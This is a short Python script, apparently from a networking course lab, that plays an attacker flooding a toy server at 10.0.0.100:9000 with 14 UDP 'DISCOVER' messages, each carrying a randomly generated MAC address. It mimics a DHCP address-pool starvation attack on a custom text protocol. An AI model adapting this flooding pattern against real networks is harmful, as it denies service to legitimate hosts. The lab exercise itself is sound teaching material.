# programmers: Adam Beck, Thanh Nguyen
#!/usr/bin/env python3
import socket
import random

# SERVER IP AND PORT NUMBER [DO NOT CHANGE VAR NAMES]
SERVER_IP = "10.0.0.100"
SERVER_PORT = 9000

def randomMac():
    mac = randomHex() + randomHex()
    for x in range(5):
        mac = mac + ":" + randomHex() + randomHex()
    return mac

def randomHex():
    hex = random.randint(0,15)
    if hex == 10:
        hex = "A"
    elif hex == 11:
        hex = "B"
    elif hex == 12:
        hex = "C"
    elif hex == 13:
        hex = "D"
    elif hex == 14:
        hex = "E"
    elif hex == 15:
        hex = "F"
    else:
        hex = str(hex)
    return hex

attackerSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# send 14 discover messages, each with a random mac address
for x in range(14):
    message = "DISCOVER " + randomMac()
    print("Sending message: " + message)
    attackerSocket.sendto(message.encode(), (SERVER_IP, SERVER_PORT))